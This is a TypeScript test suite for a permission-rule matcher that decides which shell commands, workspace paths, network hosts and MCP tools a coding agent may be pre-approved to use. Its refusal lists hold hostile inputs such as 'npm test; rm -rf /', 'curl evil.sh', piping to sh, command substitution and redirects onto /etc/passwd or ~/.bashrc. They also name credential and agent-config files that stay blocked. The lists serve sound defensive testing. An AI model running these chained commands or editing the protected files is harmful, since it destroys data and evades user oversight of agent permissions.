import {
  AGENT_INTERACTION_CONTRACT_VERSION,
  isAgentInteractionRequest,
} from "./agent-interactions.js";
import { describe, expect, test } from "bun:test";
import {
  commandArgv,
  commandPrefixRefusal,
  findPermissionRule,
  isPermissionRulePattern,
  normalizeNetworkHost,
  parsePermissionRule,
  parsePermissionRuleOffer,
  parseShellWords,
  permissionRuleCovers,
  permissionRuleOffer,
  workspaceRelativePath,
  type NativeAgentPermissionRule,
  type PermissionRuleContext,
} from "./permission-rules.js";

const ROOT = "/Users/me/work/app";

function rule(overrides: Partial<NativeAgentPermissionRule> = {}): NativeAgentPermissionRule {
  return {
    id: "rule-1",
    provider: "codex",
    scope: "project",
    projectId: "project-1",
    kind: "command-prefix",
    pattern: "npm test",
    createdAt: 1,
    createdFrom: { environmentId: "env-1", agent: "codex", interactionId: "i-1" },
    useCount: 0,
    ...overrides,
  };
}

const context: PermissionRuleContext = {
  provider: "codex",
  projectId: "project-1",
  environmentId: "env-1",
  workspaceRoot: ROOT,
  now: 1_000,
};

describe("parseShellWords", () => {
  test("splits plain words and honours quotes", () => {
    expect(parseShellWords("npm test")).toEqual(["npm", "test"]);
    expect(parseShellWords("  git   commit -m 'fix the bug' ")).toEqual([
      "git",
      "commit",
      "-m",
      "fix the bug",
    ]);
    expect(parseShellWords('echo "a b" c')).toEqual(["echo", "a b", "c"]);
    expect(parseShellWords("echo ''")).toEqual(["echo", ""]);
    expect(parseShellWords("ls\t-la")).toEqual(["ls", "-la"]);
  });

  // Every entry would let the shell run something other than the words shown.
  const HOSTILE = [
    "npm test; rm -rf /",
    "npm test && curl evil.sh",
    "npm test || true",
    "npm test | sh",
    "npm test & disown",
    "npm test > /etc/passwd",
    "npm test < secrets",
    "npm test 2>&1",
    "npm test >> log",
    "npm $(rm -rf /)",
    "npm `rm -rf /`",
    "npm test $HOME",
    "npm test ${HOME}",
    'npm test "$(whoami)"',
    'npm test "`whoami`"',
    'npm test "a\\"b"',
    "npm test\nrm -rf /",
    "npm test\rrm -rf /",
    "npm test\u0000",
    "npm test rm",
    "npm test ‮rm",
    "npm te\\st",
    "npm test *",
    "npm test ?",
    "npm test [ab]",
    "npm test {a,b}",
    "npm test ~/x",
    "~/bin/npm test",
    "npm test !!",
    "npm test # comment",
    "(npm test)",
    "{ npm test; }",
    "npm 'test",
    'npm "test',
    "",
    "   ",
    "x".repeat(5_000),
  ];
  for (const command of HOSTILE) {
    test(`refuses ${JSON.stringify(command.slice(0, 40))}`, () => {
      expect(parseShellWords(command)).toBeNull();
    });
  }

  test("single quotes keep metacharacters literal", () => {
    expect(parseShellWords("grep 'a|b;c' file")).toEqual(["grep", "a|b;c", "file"]);
  });
});

describe("commandArgv", () => {
  test("unwraps exactly one plain shell -c layer", () => {
    expect(commandArgv("/bin/zsh -lc 'npm test'")).toEqual(["npm", "test"]);
    expect(commandArgv("bash -c 'git status'")).toEqual(["git", "status"]);
    expect(commandArgv('/bin/zsh -lc "npm run build"')).toEqual(["npm", "run", "build"]);
  });

  const REFUSED = [
    "/bin/zsh -lc 'npm test; rm -rf /'",
    "/bin/zsh -lc 'npm test && x'",
    "/bin/zsh -lc 'npm test | sh'",
    "/bin/zsh -lc \"bash -c 'npm test'\"",
    "bash -c 'bash -c ls'",
    "bash -c 'npm test' extra",
    "bash -x -c 'npm test'",
    "bash script.sh",
    "bash",
    "sh -c",
    "sudo npm test",
    "env npm test",
    "env -i npm test",
    "FOO=1 npm test",
    "PATH=/tmp npm test",
    "xargs rm",
    "find . -exec rm {} +",
    "nohup npm test",
    "timeout 5 npm test",
    "eval npm test",
    "exec npm test",
    "command npm test",
    "/usr/bin/sudo npm test",
    "ssh host npm test",
    "sed -i s/a/b/ file",
    "awk '{print}' file",
    "/bin/zsh -lc 'sudo npm test'",
    "/bin/zsh -lc 'FOO=1 npm test'",
    "/bin/zsh -lc '$(npm test)'",
  ];
  for (const command of REFUSED) {
    test(`never resolves ${JSON.stringify(command)}`, () => {
      expect(commandArgv(command)).toBeNull();
    });
  }
});

describe("commandPrefixRefusal", () => {
  test("accepts ordinary two-word prefixes", () => {
    expect(commandPrefixRefusal(["npm", "test"])).toBeNull();
    expect(commandPrefixRefusal(["git", "status"])).toBeNull();
    expect(commandPrefixRefusal(["python", "scripts/check.py"])).toBeNull();
    expect(commandPrefixRefusal(["cargo", "build", "--release"])).toBeNull();
  });

  test("refuses single words, wrappers, interpreter options and unplain tokens", () => {
    expect(commandPrefixRefusal(["npm"])).not.toBeNull();
    expect(commandPrefixRefusal(["bash", "script.sh"])).not.toBeNull();
    expect(commandPrefixRefusal(["sudo", "npm"])).not.toBeNull();
    expect(commandPrefixRefusal(["env", "npm"])).not.toBeNull();
    expect(commandPrefixRefusal(["python", "-c"])).not.toBeNull();
    expect(commandPrefixRefusal(["node", "-e"])).not.toBeNull();
    expect(commandPrefixRefusal(["git", "-c"])).not.toBeNull();
    expect(commandPrefixRefusal(["git", "--exec-path=/tmp"])).not.toBeNull();
    expect(commandPrefixRefusal(["npm", "a b"])).not.toBeNull();
    expect(commandPrefixRefusal(["npm", "*"])).not.toBeNull();
    expect(commandPrefixRefusal(["npm", ""])).not.toBeNull();
    expect(commandPrefixRefusal(["FOO=1", "npm"])).not.toBeNull();
    expect(commandPrefixRefusal(Array.from({ length: 17 }, () => "a"))).not.toBeNull();
  });
});

describe("command matching", () => {
  test("matches prefixes at token boundaries only", () => {
    const npmTest = rule({ pattern: "npm test" });
    expect(permissionRuleCovers(npmTest, { kind: "command", command: "npm test" })).toBe(true);
    expect(permissionRuleCovers(npmTest, { kind: "command", command: "npm test --watch" })).toBe(
      true,
    );
    expect(
      permissionRuleCovers(npmTest, { kind: "command", command: "/bin/zsh -lc 'npm test'" }),
    ).toBe(true);
    expect(permissionRuleCovers(npmTest, { kind: "command", command: "npm testing" })).toBe(false);
    expect(permissionRuleCovers(npmTest, { kind: "command", command: "npm" })).toBe(false);
    expect(permissionRuleCovers(npmTest, { kind: "command", command: "npm  test" })).toBe(true);
    expect(permissionRuleCovers(npmTest, { kind: "command", command: "'npm test'" })).toBe(false);
    expect(permissionRuleCovers(npmTest, { kind: "command", command: "npm 'test'" })).toBe(true);
    expect(permissionRuleCovers(npmTest, { kind: "command", command: "/usr/bin/npm test" })).toBe(
      false,
    );
  });

  test("never matches a hostile command, however the prefix reads", () => {
    const npmTest = rule({ pattern: "npm test" });
    for (const command of [
      "npm test; rm -rf /",
      "npm test && rm -rf /",
      "npm test | sh",
      "npm test $(rm -rf /)",
      "npm test `id`",
      "npm test > ~/.bashrc",
      "npm test\nrm -rf /",
      "/bin/zsh -lc 'npm test; id'",
      "sudo npm test",
      "env npm test",
      "FOO=1 npm test",
    ]) {
      expect(permissionRuleCovers(npmTest, { kind: "command", command })).toBe(false);
    }
  });

  test("a non-canonical stored pattern never matches", () => {
    expect(
      permissionRuleCovers(rule({ pattern: "npm  test" }), {
        kind: "command",
        command: "npm test",
      }),
    ).toBe(false);
    expect(
      permissionRuleCovers(rule({ pattern: "sudo rm" }), { kind: "command", command: "sudo rm" }),
    ).toBe(false);
  });
});

describe("paths", () => {
  test("relativises inside the workspace and refuses everything else", () => {
    expect(workspaceRelativePath(ROOT, `${ROOT}/src/a.ts`)).toBe("src/a.ts");
    expect(workspaceRelativePath(ROOT, `${ROOT}/./src/../src/a.ts`)).toBe("src/a.ts");
    expect(workspaceRelativePath(ROOT, ROOT)).toBe("");
    expect(workspaceRelativePath(ROOT, `${ROOT}/../app2/a.ts`)).toBeNull();
    expect(workspaceRelativePath(ROOT, `${ROOT}2/a.ts`)).toBeNull();
    expect(workspaceRelativePath(ROOT, "src/a.ts")).toBeNull();
    expect(workspaceRelativePath(ROOT, "/etc/passwd")).toBeNull();
    expect(workspaceRelativePath(ROOT, "/../../etc/passwd")).toBeNull();
    expect(workspaceRelativePath(ROOT, `${ROOT}/src\\a.ts`)).toBeNull();
    expect(workspaceRelativePath(ROOT, `${ROOT}/a\u0000b`)).toBeNull();
  });

  test("agent, git and credential files are never covered", () => {
    for (const path of [
      ".git/hooks/pre-commit",
      ".claude/settings.json",
      ".codex/config.toml",
      "src/.git/config",
      ".env",
      ".env.local",
      "packages/x/.ENV",
      ".github/workflows/ci.yml",
      ".mcp.json",
      ".cursor/mcp.json",
      ".opencode/opencode.json",
      ".vscode/tasks.json",
    ]) {
      expect(workspaceRelativePath(ROOT, `${ROOT}/${path}`)).toBeNull();
    }
  });

  test("directory, file and workspace rules", () => {
    const subject = (...paths: string[]) => ({
      kind: "file-change" as const,
      paths: paths.map((path) => `${ROOT}/${path}`),
    });
    const dir = rule({ kind: "file-path", pattern: "src/" });
    expect(permissionRuleCovers(dir, subject("src/a.ts", "src/b/c.ts"), ROOT)).toBe(true);
    expect(permissionRuleCovers(dir, subject("src/a.ts", "test/a.ts"), ROOT)).toBe(false);
    expect(permissionRuleCovers(dir, subject("srcx/a.ts"), ROOT)).toBe(false);
    expect(permissionRuleCovers(dir, subject("src/.git/x"), ROOT)).toBe(false);
    expect(permissionRuleCovers(dir, subject("src/a.ts"))).toBe(false);
    const file = rule({ kind: "file-path", pattern: "README.md" });
    expect(permissionRuleCovers(file, subject("README.md"), ROOT)).toBe(true);
    expect(permissionRuleCovers(file, subject("docs/README.md"), ROOT)).toBe(false);
    const all = rule({ kind: "file-path", pattern: "./" });
    expect(permissionRuleCovers(all, subject("a", "b/c"), ROOT)).toBe(true);
    expect(permissionRuleCovers(all, subject(".env"), ROOT)).toBe(false);
    expect(permissionRuleCovers(all, { kind: "file-change", paths: ["/etc/hosts"] }, ROOT)).toBe(
      false,
    );
    expect(permissionRuleCovers(all, { kind: "file-change", paths: [] }, ROOT)).toBe(false);
  });

  test("file patterns are canonical", () => {
    for (const pattern of ["src/", "src/a.ts", "./", "a/b/c/"]) {
      expect(isPermissionRulePattern("file-path", pattern)).toBe(true);
    }
    for (const pattern of [
      "/src/",
      "../x",
      "src/../x",
      "./src",
      "",
      "/",
      "src//a",
      ".git/",
      ".env",
    ]) {
      expect(isPermissionRulePattern("file-path", pattern)).toBe(false);
    }
  });
});

describe("hosts and MCP tools", () => {
  test("normalises hosts", () => {
    expect(normalizeNetworkHost("Example.COM")).toBe("example.com");
    expect(normalizeNetworkHost("example.com.")).toBe("example.com");
    expect(normalizeNetworkHost("example.com:443")).toBe("example.com");
    expect(normalizeNetworkHost("https://api.example.com/v1?q=1")).toBe("api.example.com");
    expect(normalizeNetworkHost("10.0.0.1")).toBe("10.0.0.1");
    for (const value of ["", "user@example.com", "exa mple.com", "-bad.com", "[::1]", "a/b"]) {
      expect(normalizeNetworkHost(value)).toBeNull();
    }
  });

  test("hosts match exactly, never by suffix", () => {
    const host = rule({ kind: "network-host", pattern: "example.com" });
    expect(permissionRuleCovers(host, { kind: "network-host", host: "EXAMPLE.com:443" })).toBe(
      true,
    );
    expect(permissionRuleCovers(host, { kind: "network-host", host: "evil-example.com" })).toBe(
      false,
    );
    expect(permissionRuleCovers(host, { kind: "network-host", host: "a.example.com" })).toBe(false);
    expect(permissionRuleCovers(host, { kind: "network-host", host: "example.com.evil" })).toBe(
      false,
    );
  });

  test("MCP tools match server and tool exactly", () => {
    const tool = rule({ kind: "mcp-tool", pattern: "github/get_issue" });
    expect(
      permissionRuleCovers(tool, { kind: "mcp-tool", server: "github", tool: "get_issue" }),
    ).toBe(true);
    expect(
      permissionRuleCovers(tool, { kind: "mcp-tool", server: "github", tool: "get_issues" }),
    ).toBe(false);
    expect(
      permissionRuleCovers(tool, { kind: "mcp-tool", server: "github/get", tool: "issue" }),
    ).toBe(false);
  });
});

describe("findPermissionRule", () => {
  test("respects provider, project, environment and expiry", () => {
    const subject = { kind: "command" as const, command: "npm test" };
    expect(findPermissionRule([rule()], subject, context)?.id).toBe("rule-1");
    expect(findPermissionRule([rule({ provider: "claude" })], subject, context)).toBeNull();
    expect(findPermissionRule([rule({ provider: "any" })], subject, context)).not.toBeNull();
    expect(findPermissionRule([rule({ projectId: "other" })], subject, context)).toBeNull();
    expect(
      findPermissionRule(
        [rule({ scope: "environment", environmentId: "env-2" })],
        subject,
        context,
      ),
    ).toBeNull();
    expect(
      findPermissionRule(
        [rule({ scope: "environment", environmentId: "env-1" })],
        subject,
        context,
      ),
    ).not.toBeNull();
    expect(findPermissionRule([rule({ expiresAt: 1_000 })], subject, context)).toBeNull();
    expect(findPermissionRule([rule({ expiresAt: 1_001 })], subject, context)).not.toBeNull();
  });

  test("prefers the narrowest rule", () => {
    const subject = { kind: "command" as const, command: "npm run test" };
    const broad = rule({ id: "broad", pattern: "npm run", provider: "any" });
    const env = rule({
      id: "env",
      pattern: "npm run",
      scope: "environment",
      environmentId: "env-1",
    });
    const long = rule({ id: "long", pattern: "npm run test" });
    expect(findPermissionRule([broad, long], subject, context)?.id).toBe("long");
    expect(findPermissionRule([broad, long, env], subject, context)?.id).toBe("env");
  });
});

describe("offers", () => {
  test("command offers list valid prefixes narrowest first and preselect the proposal", () => {
    const offer = permissionRuleOffer(
      { kind: "command", command: "/bin/zsh -lc 'npm run test -- --watch'" },
      { proposal: ["npm", "run", "test"] },
    );
    expect(offer.patterns).toEqual([
      "npm run test -- --watch",
      "npm run test --",
      "npm run test",
      "npm run",
    ]);
    expect(offer.patterns[offer.suggested]).toBe("npm run test");
    expect(parsePermissionRuleOffer(offer)).toEqual(offer);
    expect(
      isAgentInteractionRequest({
        version: AGENT_INTERACTION_CONTRACT_VERSION,
        id: "offer",
        provider: "pi",
        kind: "file-approval",
        origin: "interactive-native",
        sessionId: "session",
        state: "pending",
        revision: 1,
        createdAt: 1,
        updatedAt: 1,
        presentation: { title: "Approve", questions: [], ruleOffer: offer },
      }),
    ).toBe(true);
  });

  test("an invalid proposal only falls back to the narrowest pattern", () => {
    const offer = permissionRuleOffer(
      { kind: "command", command: "npm test" },
      { proposal: ["npm"] },
    );
    expect(offer).toEqual({ kind: "command-prefix", patterns: ["npm test"], suggested: 0 });
  });

  test("unrememberable commands explain why", () => {
    for (const command of ["npm test; id", "sudo npm test", "npm", "python -c 'print(1)'"]) {
      const offer = permissionRuleOffer({ kind: "command", command });
      expect(offer.patterns).toEqual([]);
      expect(offer.unavailableReason).toBeString();
      expect(parsePermissionRuleOffer(offer)).toEqual(offer);
      expect(
        isAgentInteractionRequest({
          version: AGENT_INTERACTION_CONTRACT_VERSION,
          id: "offer",
          provider: "pi",
          kind: "file-approval",
          origin: "interactive-native",
          sessionId: "session",
          state: "pending",
          revision: 1,
          createdAt: 1,
          updatedAt: 1,
          presentation: { title: "Approve", questions: [], ruleOffer: offer },
        }),
      ).toBe(true);
    }
  });

  test("tokens with special characters are cut from the offered prefixes", () => {
    const offer = permissionRuleOffer({ kind: "command", command: "git commit -m 'a message'" });
    expect(offer.patterns).toEqual(["git commit -m", "git commit"]);
  });

  test("file offers walk up the common directory", () => {
    const offer = permissionRuleOffer(
      { kind: "file-change", paths: [`${ROOT}/src/ui/a.ts`] },
      { workspaceRoot: ROOT },
    );
    expect(offer.patterns).toEqual(["src/ui/a.ts", "src/ui/", "src/", "./"]);
    const multi = permissionRuleOffer(
      { kind: "file-change", paths: [`${ROOT}/src/ui/a.ts`, `${ROOT}/src/b.ts`] },
      { workspaceRoot: ROOT },
    );
    expect(multi.patterns).toEqual(["src/", "./"]);
    expect(
      permissionRuleOffer({ kind: "file-change", paths: ["/etc/hosts"] }, { workspaceRoot: ROOT })
        .patterns,
    ).toEqual([]);
    expect(permissionRuleOffer({ kind: "file-change", paths: [`${ROOT}/a`] }).patterns).toEqual([]);
  });

  test("an offered pattern always matches the request it came from", () => {
    const commands = [
      "npm test",
      "/bin/zsh -lc 'cargo build --release'",
      "git commit -m 'msg'",
      "bun run lint --fix",
    ];
    for (const command of commands) {
      const offer = permissionRuleOffer({ kind: "command", command });
      for (const pattern of offer.patterns) {
        expect(
          permissionRuleCovers({ kind: "command-prefix", pattern }, { kind: "command", command }),
        ).toBe(true);
      }
    }
  });
});

describe("parsePermissionRule", () => {
  test("round-trips a valid rule and drops unknown keys", () => {
    expect(parsePermissionRule({ ...rule(), extra: "x" })).toEqual(rule());
  });

  test("refuses inconsistent or non-canonical rules", () => {
    expect(parsePermissionRule(rule({ scope: "environment" }))).toBeNull();
    expect(parsePermissionRule(rule({ environmentId: "env-1" }))).toBeNull();
    expect(parsePermissionRule(rule({ pattern: "npm" }))).toBeNull();
    expect(parsePermissionRule(rule({ pattern: "npm test; id" }))).toBeNull();
    expect(parsePermissionRule({ ...rule(), scope: "host" })).toBeNull();
    expect(parsePermissionRule({ ...rule(), provider: "other" })).toBeNull();
    expect(parsePermissionRule({ ...rule(), useCount: -1 })).toBeNull();
    expect(parsePermissionRule(null)).toBeNull();
  });
});

test("the provider list mirrors the interaction contract's", async () => {
  const { AGENT_INTERACTION_PROVIDERS } = await import("./agent-interactions.js");
  const { PERMISSION_RULE_PROVIDERS } = await import("./permission-rules.js");
  expect([...PERMISSION_RULE_PROVIDERS].sort()).toEqual([...AGENT_INTERACTION_PROVIDERS].sort());
});

describe("offer contract boundaries", () => {
  test("joined command prefixes always validate, even past the total size limit", () => {
    const command = ["tool", ...Array.from({ length: 15 }, () => "x".repeat(100))].join(" ");
    const offer = permissionRuleOffer({ kind: "command", command });
    expect(offer.patterns.length).toBeGreaterThan(0);
    expect(parsePermissionRuleOffer(offer)).toEqual(offer);
    expect(
      isAgentInteractionRequest({
        version: AGENT_INTERACTION_CONTRACT_VERSION,
        id: "offer",
        provider: "pi",
        kind: "file-approval",
        origin: "interactive-native",
        sessionId: "session",
        state: "pending",
        revision: 1,
        createdAt: 1,
        updatedAt: 1,
        presentation: { title: "Approve", questions: [], ruleOffer: offer },
      }),
    ).toBe(true);
    expect(offer.patterns.every((pattern) => isPermissionRulePattern(offer.kind, pattern))).toBe(
      true,
    );
  });
  test.each([14, 15, 16, 17, 30])("deep file offers round trip (%s directories)", (depth) => {
    const offer = permissionRuleOffer(
      { kind: "file-change", paths: [`${ROOT}/${"dir/".repeat(depth)}file.ts`] },
      { workspaceRoot: ROOT },
    );
    expect(offer.patterns.length).toBeLessThanOrEqual(16);
    expect(offer.patterns[0]).toEndWith("file.ts");
    expect(offer.patterns.at(-1)).toBe("./");
    expect(parsePermissionRuleOffer(offer)).toEqual(offer);
    expect(
      isAgentInteractionRequest({
        version: AGENT_INTERACTION_CONTRACT_VERSION,
        id: "offer",
        provider: "pi",
        kind: "file-approval",
        origin: "interactive-native",
        sessionId: "session",
        state: "pending",
        revision: 1,
        createdAt: 1,
        updatedAt: 1,
        presentation: { title: "Approve", questions: [], ruleOffer: offer },
      }),
    ).toBe(true);
  });
  test.each([
    "python3.12",
    "/usr/bin/python3.12",
    "nodejs",
    "ruby3.3",
    "php8.4",
    "lua5.4",
    "pypy3",
  ])("refuses option-bearing interpreter %s", (interpreter) => {
    const pattern = `${interpreter} -c`;
    expect(commandPrefixRefusal([interpreter, "-c"])).not.toBeNull();
    expect(
      permissionRuleOffer({ kind: "command", command: `${pattern} 'print(1)'` }).patterns,
    ).toEqual([]);
    expect(
      permissionRuleCovers(
        { kind: "command-prefix", pattern },
        { kind: "command", command: `${pattern} evil` },
      ),
    ).toBe(false);
  });
});
